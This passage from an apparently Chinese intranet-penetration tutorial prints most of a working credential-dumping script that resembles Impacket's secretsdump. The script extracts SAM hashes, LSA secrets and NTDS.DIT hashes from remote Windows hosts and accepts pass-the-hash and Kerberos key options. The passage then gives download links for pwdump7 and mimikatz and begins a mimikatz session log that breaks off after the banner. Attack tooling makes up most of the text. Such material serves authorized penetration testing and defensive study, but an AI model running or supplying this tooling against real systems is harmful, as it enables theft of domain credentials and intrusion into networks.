<span class="literal">False</span> <span class="keyword">and</span> self.__justDCNTLM <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">or</span> self.__useVSSMethod <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        self.__remoteOps.enableRegistry()</span><br><span class="line">                        bootKey             = self.__remoteOps.getBootKey()</span><br><span class="line">                        <span class="comment"># Let&#x27;s check whether target system stores LM Hashes</span></span><br><span class="line">                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    self.__canProcessSAMLSA = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">str</span>(e).find(<span class="string">&#x27;STATUS_USER_SESSION_DELETED&#x27;</span>) <span class="keyword">and</span> os.getenv(<span class="string">&#x27;KRB5CCNAME&#x27;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> \</span><br><span class="line">                        <span class="keyword">and</span> self.__doKerberos <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        <span class="comment"># Giving some hints here when SPN target name validation is set to something different to Off</span></span><br><span class="line">                        <span class="comment"># This will prevent establishing SMB connections using TGS for SPNs different to cifs/</span></span><br><span class="line">                        logging.error(<span class="string">&#x27;Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user&#x27;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        logging.error(<span class="string">&#x27;RemoteOperations failed: %s&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># If RemoteOperations succeeded, then we can extract SAM and LSA</span></span><br><span class="line">            <span class="keyword">if</span> self.__justDC <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">and</span> self.__justDCNTLM <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">and</span> self.__canProcessSAMLSA:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.__isRemote <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        SAMFileName         = self.__remoteOps.saveSAM()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        SAMFileName         = self.__samHive</span><br><span class="line"></span><br><span class="line">                    self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)</span><br><span class="line">                    self.__SAMHashes.dump()</span><br><span class="line">                    <span class="keyword">if</span> self.__outputFileName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        self.__SAMHashes.export(self.__outputFileName)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    logging.error(<span class="string">&#x27;SAM hashes extraction failed: %s&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.__isRemote <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        SECURITYFileName = self.__remoteOps.saveSECURITY()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        SECURITYFileName = self.__securityHive</span><br><span class="line"></span><br><span class="line">                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,</span><br><span class="line">                                                   isRemote=self.__isRemote, history=self.__history)</span><br><span class="line">                    self.__LSASecrets.dumpCachedHashes()</span><br><span class="line">                    <span class="keyword">if</span> self.__outputFileName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        self.__LSASecrets.exportCached(self.__outputFileName)</span><br><span class="line">                    self.__LSASecrets.dumpSecrets()</span><br><span class="line">                    <span class="keyword">if</span> self.__outputFileName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        self.__LSASecrets.exportSecrets(self.__outputFileName)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">                        <span class="keyword">import</span> traceback</span><br><span class="line">                        traceback.print_exc()</span><br><span class="line">                    logging.error(<span class="string">&#x27;LSA hashes extraction failed: %s&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># NTDS Extraction we can try regardless of RemoteOperations failing. It might still work</span></span><br><span class="line">            <span class="keyword">if</span> self.__isRemote <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">if</span> self.__useVSSMethod <span class="keyword">and</span> self.__remoteOps <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    NTDSFileName = self.__remoteOps.saveNTDS()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    NTDSFileName = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                NTDSFileName = self.__ntdsFile</span><br><span class="line"></span><br><span class="line">            self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,</span><br><span class="line">                                           noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,</span><br><span class="line">                                           useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,</span><br><span class="line">                                           pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,</span><br><span class="line">                                           outputFileName=self.__outputFileName, justUser=self.__justUser,</span><br><span class="line">                                           printUserStatus= self.__printUserStatus)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.__NTDSHashes.dump()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">                    <span class="keyword">import</span> traceback</span><br><span class="line">                    traceback.print_exc()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">str</span>(e).find(<span class="string">&#x27;ERROR_DS_DRA_BAD_DN&#x27;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="comment"># We don&#x27;t store the resume file if this error happened, since this error is related to lack</span></span><br><span class="line">                    <span class="comment"># of enough privileges to access DRSUAPI.</span></span><br><span class="line">                    resumeFile = self.__NTDSHashes.getResumeSessionFile()</span><br><span class="line">                    <span class="keyword">if</span> resumeFile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        os.unlink(resumeFile)</span><br><span class="line">                logging.error(e)</span><br><span class="line">                <span class="keyword">if</span> self.__justUser <span class="keyword">and</span> <span class="built_in">str</span>(e).find(<span class="string">&quot;ERROR_DS_NAME_ERROR_NOT_UNIQUE&quot;</span>) &gt;=<span class="number">0</span>:</span><br><span class="line">                    logging.info(<span class="string">&quot;You just got that error because there might be some duplicates of the same name. &quot;</span></span><br><span class="line">                                 <span class="string">&quot;Try specifying the domain name for the user as well. It is important to specify it &quot;</span></span><br><span class="line">                                 <span class="string">&quot;in the form of NetBIOS domain name/user (e.g. contoso/Administratror).&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.__useVSSMethod <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">                    logging.info(<span class="string">&#x27;Something wen\&#x27;t wrong with the DRSUAPI approach. Try again with -use-vss parameter&#x27;</span>)</span><br><span class="line">            self.cleanup()</span><br><span class="line">        <span class="keyword">except</span> (Exception, KeyboardInterrupt) <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">                <span class="keyword">import</span> traceback</span><br><span class="line">                traceback.print_exc()</span><br><span class="line">            logging.error(e)</span><br><span class="line">            <span class="keyword">if</span> self.__NTDSHashes <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(e, KeyboardInterrupt):</span><br><span class="line">                    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        answer =  <span class="built_in">input</span>(<span class="string">&quot;Delete resume session file? [y/N] &quot;</span>)</span><br><span class="line">                        <span class="keyword">if</span> answer.upper() == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                            answer = <span class="string">&#x27;N&#x27;</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">elif</span> answer.upper() == <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">                            answer = <span class="string">&#x27;Y&#x27;</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">elif</span> answer.upper() == <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">                            answer = <span class="string">&#x27;N&#x27;</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> answer == <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">                        resumeFile = self.__NTDSHashes.getResumeSessionFile()</span><br><span class="line">                        <span class="keyword">if</span> resumeFile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                            os.unlink(resumeFile)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.cleanup()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cleanup</span>(<span class="params">self</span>):</span></span><br><span class="line">        logging.info(<span class="string">&#x27;Cleaning up... &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> self.__remoteOps:</span><br><span class="line">            self.__remoteOps.finish()</span><br><span class="line">        <span class="keyword">if</span> self.__SAMHashes:</span><br><span class="line">            self.__SAMHashes.finish()</span><br><span class="line">        <span class="keyword">if</span> self.__LSASecrets:</span><br><span class="line">            self.__LSASecrets.finish()</span><br><span class="line">        <span class="keyword">if</span> self.__NTDSHashes:</span><br><span class="line">            self.__NTDSHashes.finish()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Process command-line arguments.</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># Explicitly changing the stdout encoding format</span></span><br><span class="line">    <span class="keyword">if</span> sys.stdout.encoding <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># Output is redirected to a file</span></span><br><span class="line">        sys.stdout = codecs.getwriter(<span class="string">&#x27;utf8&#x27;</span>)(sys.stdout)</span><br><span class="line"></span><br><span class="line">    print(version.BANNER)</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser(add_help = <span class="literal">True</span>, description = <span class="string">&quot;Performs various techniques to dump secrets from &quot;</span></span><br><span class="line">                                                      <span class="string">&quot;the remote machine without executing any agent there.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;target&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;[[domain/]username[:password]@]&lt;targetName or address&gt; or LOCAL&#x27;</span></span><br><span class="line">                                                       <span class="string">&#x27; (if you want to parse local files)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-ts&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Adds timestamp to every logging output&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-debug&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Turn DEBUG output ON&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-system&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;SYSTEM hive to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-bootkey&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;bootkey for SYSTEM hive&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-security&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;SECURITY hive to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-sam&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;SAM hive to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-ntds&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;NTDS.DIT file to parse&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-resumefile&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;resume file name to resume NTDS.DIT session dump (only &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;available to DRSUAPI approach). This file will also be used to keep updating the session\&#x27;s &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;state&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-outputfile&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;base output filename. Extensions will be added for sam, secrets, cached and ntds&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-use-vss&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;Use the VSS method insead of default DRSUAPI&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-exec-method&#x27;</span>, choices=[<span class="string">&#x27;smbexec&#x27;</span>, <span class="string">&#x27;wmiexec&#x27;</span>, <span class="string">&#x27;mmcexec&#x27;</span>], nargs=<span class="string">&#x27;?&#x27;</span>, default=<span class="string">&#x27;smbexec&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Remote exec &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;method to use at target (only when using -use-vss). Default: smbexec&#x27;</span>)</span><br><span class="line">    group = parser.add_argument_group(<span class="string">&#x27;display options&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-just-dc-user&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, metavar=<span class="string">&#x27;USERNAME&#x27;</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. &#x27;</span></span><br><span class="line">                            <span class="string">&#x27;Implies also -just-dc switch&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-just-dc&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-just-dc-ntlm&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;Extract only NTDS.DIT data (NTLM hashes only)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-pwd-last-set&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\&#x27;t apply to -outputfile data&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-user-status&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;Display whether or not the user is disabled&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-history&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Dump password history, and LSA secrets OldVal&#x27;</span>)</span><br><span class="line">    group = parser.add_argument_group(<span class="string">&#x27;authentication&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    group.add_argument(<span class="string">&#x27;-hashes&#x27;</span>, action=<span class="string">&quot;store&quot;</span>, metavar = <span class="string">&quot;LMHASH:NTHASH&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;NTLM hashes, format is LMHASH:NTHASH&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-no-pass&#x27;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;don\&#x27;t ask for password (useful for -k)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-k&#x27;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Use Kerberos authentication. Grabs credentials from ccache file &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use&#x27;</span></span><br><span class="line">                             <span class="string">&#x27; the ones specified in the command line&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-aesKey&#x27;</span>, action=<span class="string">&quot;store&quot;</span>, metavar = <span class="string">&quot;hex key&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;AES key to use for Kerberos Authentication&#x27;</span></span><br><span class="line">                                                                            <span class="string">&#x27; (128 or 256 bits)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-keytab&#x27;</span>, action=<span class="string">&quot;store&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Read keys for SPN from keytab file&#x27;</span>)</span><br><span class="line">    group = parser.add_argument_group(<span class="string">&#x27;connection&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-dc-ip&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>,metavar = <span class="string">&quot;ip address&quot;</span>,  <span class="built_in">help</span>=<span class="string">&#x27;IP Address of the domain controller. If &#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;ommited it use the domain part (FQDN) specified in the target parameter&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-target-ip&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, metavar=<span class="string">&quot;ip address&quot;</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;IP Address of the target machine. If omitted it will use whatever was specified as target. &#x27;</span></span><br><span class="line">                            <span class="string">&#x27;This is useful when target is the NetBIOS name and you cannot resolve it&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)==<span class="number">1</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    options = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Init the example&#x27;s logger theme</span></span><br><span class="line">    logger.init(options.ts)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.debug <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">        logging.getLogger().setLevel(logging.DEBUG)</span><br><span class="line">        <span class="comment"># Print the Library&#x27;s installation path</span></span><br><span class="line">        logging.debug(version.getInstallationPath())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.getLogger().setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">    domain, username, password, remoteName = re.<span class="built_in">compile</span>(<span class="string">&#x27;(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)&#x27;</span>).match(</span><br><span class="line">        options.target).groups(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#In case the password contains &#x27;@&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;@&#x27;</span> <span class="keyword">in</span> remoteName:</span><br><span class="line">        password = password + <span class="string">&#x27;@&#x27;</span> + remoteName.rpartition(<span class="string">&#x27;@&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        remoteName = remoteName.rpartition(<span class="string">&#x27;@&#x27;</span>)[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.just_dc_user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> options.use_vss <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;-just-dc-user switch is not supported in VSS mode&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> options.resumefile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> username == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;-just-dc-user not compatible in LOCAL mode&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># Having this switch on implies not asking for anything else.</span></span><br><span class="line">            options.just_dc = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.use_vss <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> options.resumefile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        logging.error(<span class="string">&#x27;resuming a previous NTDS.DIT dump session is not supported in VSS mode&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> username == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> options.resumefile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        logging.error(<span class="string">&#x27;resuming a previous NTDS.DIT dump session is not supported in LOCAL mode&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> username == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> options.system <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> options.bootkey <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;Either the SYSTEM hive or bootkey is required for local parsing, check help&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.target_ip <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            options.target_ip = remoteName</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> domain <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            domain = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.keytab <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)</span><br><span class="line">            options.k = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> password == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> username != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> options.hashes <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> options.no_pass <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">and</span> options.aesKey <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line">            password = getpass(<span class="string">&quot;Password:&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.aesKey <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            options.k = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    dumper = DumpSecrets(remoteName, username, password, domain, options)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dumper.dump()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">            <span class="keyword">import</span> traceback</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">        logging.error(e)</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/57.png?raw=true" alt="image-20200803152140006"></p>
<p>还可以用<strong>pwdump7.exe</strong>直接获取，下载地址如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.tarasco.org&#x2F;security&#x2F;pwdump_7&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/58.png?raw=true" alt="image-20200803153049297"></p>
<p>还有<strong>mimikatz</strong>也可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz</span><br></pre></td></tr></table></figure>

<p>运行后如下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\ascotbe&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x86) #19041 Jul 15 2020 16:10:22</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span 